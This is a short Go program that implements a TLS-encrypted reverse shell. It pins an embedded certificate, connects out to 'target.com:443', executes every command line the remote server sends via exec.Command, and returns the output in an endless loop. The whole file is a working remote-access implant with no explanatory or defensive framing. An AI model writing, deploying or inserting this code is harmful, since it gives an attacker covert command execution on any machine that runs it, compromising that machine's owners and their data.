

package main

import (
    "crypto/tls"
    "crypto/x509"
    "bufio"
    "fmt"
    "os/exec"
    "os"
    "strings"
)

func doCmd(cmdStr string) string {
	cmdStr = strings.TrimSuffix(cmdStr, "\n")
	arrCmdStr := strings.Fields(cmdStr)
	switch arrCmdStr[0] {
	case "exit":
		os.Exit(0)
	}
	cmd := exec.Command(arrCmdStr[0], arrCmdStr[1:]...)
	o, e := cmd.CombinedOutput()
    	if e != nil {
           return fmt.Sprintf("Error: %s\n", e)
    	}
        return string(o)
}

func main() {

    rootCA := `-----BEGIN CERTIFICATE-----
MIIBVTCB3QIJAI4i5bnBvx0YMAoGCCqGSM49BAMCMBUxEzARBgNVBAMMCnRhcmdl
dC5jb20wHhcNMTkxMTE3MjEwNTQzWhcNMjkxMTE0MjEwNTQzWjAVMRMwEQYDVQQD
DAp0YXJnZXQuY29tMHYwEAYHKoZIzj0CAQYFK4EEACIDYgAEM+BcpI6nVodgJApb
inVp2fZoptOi2pKE/UwjkH976U/rn4HZhjql5oqHEh9GALQ1/BLcEhslZkGZqsxo
m3tXgjzihi0KXTOVghYDpwke8hArea1j2U4EvlZCcB+we0yxMAoGCCqGSM49BAMC
A2cAMGQCMGB1e+GIUOX4sqhy7qfS42Zcmq+sDHmWOS/pxXaWFqAVZppG7RHendKZ
AIa0gVKi3gIwCGOtSgoYOjy8cO12D1jSzS49jqCdLQIXYZZEn0CMrDHCxORvNv8f
tq9gneGOHkL1
-----END CERTIFICATE-----`

    roots := x509.NewCertPool()
    ok := roots.AppendCertsFromPEM([]byte(rootCA))
    if !ok {
        panic("")
    }

    tlscfg := &tls.Config{
        RootCAs: roots,
        //InsecureSkipVerify: true,
        MinVersion:               tls.VersionTLS12,
        CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
        PreferServerCipherSuites: true,
        CipherSuites: []uint16{
            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
            tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_RSA_WITH_AES_256_CBC_SHA,
        },
    }

    conn, _ := tls.Dial("tcp", "target.com:443", tlscfg)

    for {

        m, _ := bufio.NewReader(conn).ReadString('\n')
        o := doCmd(m)

    	fmt.Fprintf(conn, "%s\n", o)
    }

}

